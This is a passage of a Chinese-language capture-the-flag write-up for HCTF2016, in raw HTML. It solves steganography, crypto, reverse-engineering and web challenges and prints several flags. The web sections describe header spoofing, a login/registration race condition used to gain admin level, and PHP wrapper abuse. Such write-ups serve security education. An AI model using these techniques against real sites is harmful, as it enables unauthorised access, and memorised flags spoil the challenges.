alt2"><code class="plain plain">return&nbsp;0;</code></div><div class="line number192 index191 alt1"><code class="plain plain">}</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">gogogo</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">魂斗罗小游戏，我有金手指我怕谁。233</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">玩游戏得flag系列&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">hctf{ju5tf0rfun}</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">你们所知道的隐写就仅此而已吗</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Blindwatermark隐写，在知乎上有一个答主讲了如何进行盲水印隐写，利用的是傅立叶变换吧。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">利用 matlab 运行搜索到的代码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">imageA&nbsp;=&nbsp;imread('3.bmp','bmp');</code></div><div class="line number2 index1 alt1"><code class="plain plain">fftA&nbsp;=&nbsp;fft2(imageA);</code></div><div class="line number3 index2 alt2"><code class="plain plain">imshow(fftshift(fftA))</code></div><div class="line number4 index3 alt1"><code class="plain plain">imshow(fft(rgb2gray(imread('shimakaze.bmp'))),&nbsp;[1,2]);</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Flag如下：</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01882405ae49e0c914.jpg" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01882405ae49e0c914.jpg" title="t01dd73a5472fe72fe1.jpg" alt="http://p6.qhimg.com/t01dd73a5472fe72fe1.jpg" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">pic again</span></strong></span></p><hr><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">用stegsolve进行LSB检测</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">发现在 0 通道有异常</span></p><p style="text-align: center; text-indent: 0em;"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01e9ad2551e136fb6d.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01e9ad2551e136fb6d.png" title="t01ac1cc0a1127b19e4.png" alt="http://p3.qhimg.com/t01ac1cc0a1127b19e4.png" style="visibility: visible;"></a><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">用StegSolve的Data Extract功能将隐写信息提取出来</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t014c92c3a90c3e5451.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t014c92c3a90c3e5451.png" title="t01612f21c3d5db9407.png" alt="http://p1.qhimg.com/t01612f21c3d5db9407.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Preview 发现存在一个压缩包点击save bin</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01af36f7203e0bcfcb.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01af36f7203e0bcfcb.png" title="t01c01b534037b96e84.png" alt="http://p3.qhimg.com/t01c01b534037b96e84.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在压缩包中的文件找到了flag</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">杂项签到</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">from&nbsp;Crypto&nbsp;import&nbsp;Random</code></div><div class="line number2 index1 alt1"><code class="plain plain">from&nbsp;Crypto.Cipher&nbsp;import&nbsp;AES</code></div><div class="line number3 index2 alt2"><code class="plain plain">import&nbsp;sys</code></div><div class="line number4 index3 alt1"><code class="plain plain">import&nbsp;base64</code></div><div class="line number5 index4 alt2"><code class="plain plain">def&nbsp;decrypt(encrypted,&nbsp;passphrase):</code></div><div class="line number6 index5 alt1"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">IV&nbsp;=&nbsp;encrypted[:16]</code></div><div class="line number7 index6 alt2"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">aes&nbsp;=&nbsp;AES.new(passphrase,&nbsp;AES.MODE_CBC,&nbsp;IV)</code></div><div class="line number8 index7 alt1"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;aes.decrypt(encrypted[16:])</code></div><div class="line number9 index8 alt2"><code class="plain plain">def&nbsp;encrypt(message,&nbsp;passphrase):</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">IV&nbsp;=&nbsp;message[:16]</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">length&nbsp;=&nbsp;16</code></div><div class="line number12 index11 alt1"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">count&nbsp;=&nbsp;len(message)</code></div><div class="line number13 index12 alt2"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">padding&nbsp;=&nbsp;length&nbsp;-&nbsp;(count&nbsp;%&nbsp;length)</code></div><div class="line number14 index13 alt1"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">message&nbsp;=&nbsp;message&nbsp;+&nbsp;'\0'&nbsp;*&nbsp;padding</code></div><div class="line number15 index14 alt2"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">aes&nbsp;=&nbsp;AES.new(passphrase,&nbsp;AES.MODE_CBC,&nbsp;IV)</code></div><div class="line number16 index15 alt1"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;aes.encrypt(message)</code></div><div class="line number17 index16 alt2"><code class="plain plain">IV&nbsp;=&nbsp;'YUFHJKVWEASDGQDH'</code></div><div class="line number18 index17 alt1"><code class="plain plain">message&nbsp;=&nbsp;IV&nbsp;+&nbsp;'flag&nbsp;is&nbsp;hctf{xxxxxxxxxxxxxxx}'</code></div><div class="line number19 index18 alt2"><code class="plain plain">print&nbsp;len(message)</code></div><div class="line number20 index19 alt1"><code class="plain plain">example&nbsp;=&nbsp;encrypt(message,&nbsp;'Qq4wdrhhyEWe4qBF')</code></div><div class="line number21 index20 alt2"><code class="plain plain">print&nbsp;example</code></div><div class="line number22 index21 alt1"><code class="plain plain">example&nbsp;=&nbsp;decrypt(example,&nbsp;'Qq4wdrhhyEWe4qBF')</code></div><div class="line number23 index22 alt2"><code class="plain plain">print&nbsp;example</code></div><div class="line number24 index23 alt1"><code class="plain plain">fl="mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA=="</code></div><div class="line number25 index24 alt2"><code class="plain plain">print&nbsp;decrypt(fl.decode("base64"),&nbsp;'Qq4wdrhhyEWe4qBF')</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Re 50</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">题目的逻辑是这样的&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">字符串一共20位，前面的奇数和后面的倒数的技术互换，前面一半的的偶数和后面一半的偶数为下一个偶数位+2，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">字符串变换后 出来是与0xcc进行异或</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01bf0cf9abbebca46d.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01bf0cf9abbebca46d.png" title="t015983e18724a60236.png" alt="http://p1.qhimg.com/t015983e18724a60236.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">用下表来表示的话，那么应该是&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">0&nbsp;19</code></div><div class="line number2 index1 alt1"><code class="plain plain">2&nbsp;17</code></div><div class="line number3 index2 alt2"><code class="plain plain">4&nbsp;15</code></div><div class="line number4 index3 alt1"><code class="plain plain">6&nbsp;13</code></div><div class="line number5 index4 alt2"><code class="plain plain">8&nbsp;11</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">进行交换</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">7&nbsp;&nbsp;9</code></div><div class="line number2 index1 alt1"><code class="plain plain">5&nbsp;&nbsp;7</code></div><div class="line number3 index2 alt2"><code class="plain plain">3&nbsp;&nbsp;5</code></div><div class="line number4 index3 alt1"><code class="plain plain">1&nbsp;&nbsp;3</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">右边的+2赋值给左边的</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们逆向怎么做呢，先比较的字符串异或，得到操作后的正确的字符串，再反操作字串，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后比较的key是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">003CFDAC&nbsp;B1&nbsp;00&nbsp;00&nbsp;00&nbsp;A4&nbsp;00&nbsp;00&nbsp;00&nbsp;B5&nbsp;00&nbsp;00&nbsp;00&nbsp;87&nbsp;00&nbsp;00&nbsp;00</code></div><div class="line number2 index1 alt1"><code class="plain plain">003CFDBC&nbsp;AD&nbsp;00&nbsp;00&nbsp;00&nbsp;AD&nbsp;00&nbsp;00&nbsp;00&nbsp;93&nbsp;00&nbsp;00&nbsp;00&nbsp;B9&nbsp;00&nbsp;00&nbsp;00</code></div><div class="line number3 index2 alt2"><code class="plain plain">003CFDCC&nbsp;BF&nbsp;00&nbsp;00&nbsp;00&nbsp;BF&nbsp;00&nbsp;00&nbsp;00&nbsp;93&nbsp;00&nbsp;00&nbsp;00&nbsp;FD&nbsp;00&nbsp;00&nbsp;00</code></div><div class="line number4 index3 alt1"><code class="plain plain">003CFDDC&nbsp;FC&nbsp;00&nbsp;00&nbsp;00&nbsp;BB&nbsp;00&nbsp;00&nbsp;00&nbsp;FF&nbsp;00&nbsp;00&nbsp;00&nbsp;B7&nbsp;00&nbsp;00&nbsp;00</code></div><div class="line number5 index4 alt2"><code class="plain plain">003CFDEC&nbsp;F9&nbsp;00&nbsp;00&nbsp;00&nbsp;B8&nbsp;00&nbsp;00&nbsp;00&nbsp;ED&nbsp;00&nbsp;00&nbsp;00&nbsp;A4&nbsp;00&nbsp;00&nbsp;00</code></div></div></td></tr></tbody></table><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0188d67f364616178a.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0188d67f364616178a.png" title="t0105f4f1b427e48709.png" alt="http://p6.qhimg.com/t0105f4f1b427e48709.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在IDA中也能看出来这些</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01d6826442ed9bbc42.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01d6826442ed9bbc42.png" title="t01a0114524f503afed.png" alt="http://p4.qhimg.com/t01a0114524f503afed.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">V4是输入后变换的</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">变换后异或 再与key比较</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所以题目应该是 正确的flag hctf{It_1s_s0_3a5y!} 输入之后，进行上述的位变换，然后与0xcc异或，最后与上图中的key比较。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">将上述的key 与0xcc异或转字符串得到}hyKaa_uss_10t3{5t!h</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后进行位变换</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">str='}hyKaa_uss_10t3{5t!h'</code></div><div class="line number2 index1 alt1"><code class="plain plain">s=list(str)</code></div><div class="line number3 index2 alt2"><code class="plain plain">leng=len(str)</code></div><div class="line number4 index3 alt1"><code class="plain plain">for&nbsp;i&nbsp;in&nbsp;range(0,leng/2,2):</code></div><div class="line number5 index4 alt2"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">temp&nbsp;=&nbsp;s[i]</code></div><div class="line number6 index5 alt1"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">s[i]=s[leng-i-1]</code></div><div class="line number7 index6 alt2"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">s[leng-i-1]=temp</code></div><div class="line number8 index7 alt1"><code class="plain plain">print&nbsp;''.join(s)</code></div><div class="line number9 index8 alt2"><code class="plain plain">for&nbsp;i&nbsp;in&nbsp;range(9,1,-2):</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">s[i]&nbsp;=&nbsp;chr(ord(s[i-2])-2)</code></div><div class="line number11 index10 alt2"><code class="plain plain">print&nbsp;''.join(s)</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">由于是栈操作得到的flag 第二位被覆盖了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们根据格式修改一下就好了所以flag是</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">hctf{It_1s_s0_3a5y!}</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&gt;&gt;&gt;&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">level1-2099年的flag</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">题目提示需要ios99系统</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">找一个ios系统的useragent</span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">Mozilla/5.0&nbsp;(iPhone;&nbsp;CPU&nbsp;iPhone&nbsp;OS&nbsp;9_1&nbsp;like&nbsp;Mac&nbsp;OS&nbsp;X)&nbsp;AppleWebKit/601.1.46&nbsp;(KHTML,&nbsp;like&nbsp;Gecko)&nbsp;Version/9.0&nbsp;Mobile/13B143&nbsp;Safari/601.1</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">修改为</span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">Mozilla/5.0&nbsp;(iPhone;&nbsp;CPU&nbsp;iPhone&nbsp;OS&nbsp;99_1&nbsp;like&nbsp;Mac&nbsp;OS&nbsp;X)&nbsp;AppleWebKit/601.1.46&nbsp;(KHTML,&nbsp;like&nbsp;Gecko)&nbsp;Version/9.0&nbsp;Mobile/13B143&nbsp;Safari/601.1</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">再发送请求</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在返回包中找到包含flag的请求头</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">level2-RESTFUL</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">打开网页，chrome查看到xhr请求，</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t014826b2cded57d259.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t014826b2cded57d259.png" title="t01a280758ebce7d88f.png" alt="http://p4.qhimg.com/t01a280758ebce7d88f.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">于是对index.php尝试put请求并加上参数money（用restful的格式）得到flag</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t013a5fb00057fa6e88.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t013a5fb00057fa6e88.png" title="t017e25e10b5ff1b48c.png" alt="http://p8.qhimg.com/t017e25e10b5ff1b48c.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">level2-giligili</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><a href="https://github.com/ctfs/write-ups-2016/tree/master/sctf-2016-q1/web/obfuscation-180" _src="https://github.com/ctfs/write-ups-2016/tree/master/sctf-2016-q1/web/obfuscation-180">https://github.com/ctfs/write-ups-2016/tree/master/sctf-2016-q1/web/obfuscation-180</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">分析方法相同，但是遇到一个坑，按照xor的结果第二段字符串为b?H¹，放到网页里提示成功却不是正确的flag，猜一下，发现用y0ur代替b?H¹ 也是正确的解。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">level2-兵者多诡</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><a href="https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/" _src="https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/">https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">找到上面这篇writeup后学习各种姿势后，照着拿到了flag</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">level3-必须比香港记者跑得快</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><a href="http://changelog.hctf.io/README.md" _src="http://changelog.hctf.io/README.md">http://changelog.hctf.io/README.md</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"># 跑得比谁都快</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">## ChangeLog 的故事</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">## 这里是加了.git之后忘删的README.md &nbsp;XD by Aklis</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">## ChangeLog</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">- 2016.11.11</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">完成登陆功能，登陆之后在session将用户名和用户等级放到会话信息里面。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">判断sessioin['level']是否能在index.php查看管理员才能看到的**东西**。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">XD</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">- 2016.11.10</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">老板说注册成功的用户不能是管理员，我再写多一句把权限降为普通用户好啰。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">- 2016.10</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我把注册功能写好了</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看到注册的过程中包含</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">添加一个用户初始level &gt; 0，降级该用户</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">登陆的时候将level放入session</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">于是判断存在条件竞争。在注册操作中降级用户之前登陆。Session中保存的用户level就不为0</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">level3-guestbook</span></strong></span></p><hr><p style="text-align: center; text-indent: 0em;"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01872ec33afa63fd7f.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01872ec33afa63fd7f.png" title="t012dc74cc7bf3a4314.png" alt="http://p6.qhimg.com/t012dc74cc7bf3a4314.png" style="text-align: center; visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">验证码只需要爆破1-99999的数字的MD5，会有一个MD5的前四4位与网页中的相同。</span></p><p style="text-indent: 2em; text-align: left;"><span 